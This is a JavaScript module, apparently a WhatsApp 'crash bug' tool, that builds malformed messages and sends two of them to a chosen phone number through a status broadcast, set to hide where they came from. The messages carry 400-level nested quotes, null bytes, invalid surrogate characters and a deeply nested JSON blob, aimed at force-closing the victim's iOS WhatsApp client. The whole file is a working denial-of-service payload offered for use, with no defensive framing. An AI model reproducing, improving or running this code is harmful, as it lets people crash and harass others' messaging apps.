const crypto = require("crypto");

module.exports = async function forcecloseIOS(sock, target) {
    const jid = target.includes("@") ? target : `${target}@s.whatsapp.net`;

    const buildNestedContext = (depth) => {
        let inner = { remoteJid: "\0", stanzaId: crypto.randomBytes(8).toString("hex") };
        for (let i = 0; i < depth; i++) {
            inner = {
                remoteJid: "\0",
                stanzaId: crypto.randomBytes(8).toString("hex"),
                participant: "\0",
                mentionedJid: [`${"0".repeat(64)}@s.whatsapp.net`],
                quotedMessage: { extendedTextMessage: { text: "\0", contextInfo: inner } }
            };
        }
        return inner;
    };

    const badJson = (() => {
        let o = { a: "\uD800" };
        for (let i = 0; i < 500; i++) o = { n: o, k: "\0", v: "\uDFFF" };
        return JSON.stringify(o);
    })();

    const crashPayload = {
        interactiveMessage: {
            header: { title: "\0", hasMediaAttachment: false },
            body: { text: "\0" },
            nativeFlowMessage: {
                buttons: [],
                messageParamsJson: badJson
            },
            contextInfo: {
                addonActionSection: {
                    actionType: null,
                    primitives: []
                },
                quotedMessage: buildNestedContext(400)
            }
        }
    };

    const viewOncePayload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "\0", hasMediaAttachment: false },
                    nativeFlowMessage: { buttons: [] },
                    contextInfo: {
                        addonActionSection: {
                            actionType: null,
                            primitives: []
                        },
                        quotedMessage: buildNestedContext(400)
                    }
                }
            }
        }
    };

    const baseId = crypto.randomBytes(16).toString("hex").toUpperCase();

    await sock.relayMessage("status@broadcast", crashPayload, {
        messageId: `${baseId}A`,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { appdata: "default", platform: "ios" },
                content: [
                    { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
                    { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                ]
            }
        ]
    });

    await new Promise(r => setTimeout(r, 200));

    await sock.relayMessage("status@broadcast", viewOncePayload, {
        messageId: `${baseId}B`,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { appdata: "default", platform: "ios" },
                content: [
                    { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
                    { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                ]
            }
        ]
    });
};
